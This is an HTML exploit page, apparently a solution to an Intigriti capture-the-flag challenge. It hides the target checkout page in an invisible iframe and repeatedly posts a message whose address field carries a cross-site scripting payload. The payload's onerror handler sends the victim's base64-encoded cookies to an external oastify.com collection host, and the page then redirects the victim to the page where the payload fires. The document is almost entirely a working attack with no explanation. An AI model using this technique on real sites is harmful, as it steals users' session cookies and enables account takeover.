<!DOCTYPE html>
<html lang="en">
<head><title>Exploit</title></head>
<body>
    <h1 style="color:white">Processing Giveaway...</h1>
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="1" height="1" style="visibility:hidden"></iframe>

    <script>
        // The XSS payload for MarketWatch.html
        const XSS = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?c=\'+btoa(document.cookie))">';
        
        window.onload = function() {
            const frame = document.getElementById('target').contentWindow;
            
            // Step 2: Spam the transaction message for 5 seconds to ensure it hits
            let count = 0;
            const spammer = setInterval(() => {
                frame.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        currency: '1337COIN',
                        amount: 1,
                        toAddress: XSS 
                    }
                }, '*');
                count++;
                if (count > 20) clearInterval(spammer);
            }, 500);

            // Step 3: Wait for transaction to settle, then redirect the WHOLE page to MarketWatch
            setTimeout(() => {
                window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
            }, 6000);
        };
    </script>
</body>
</html>
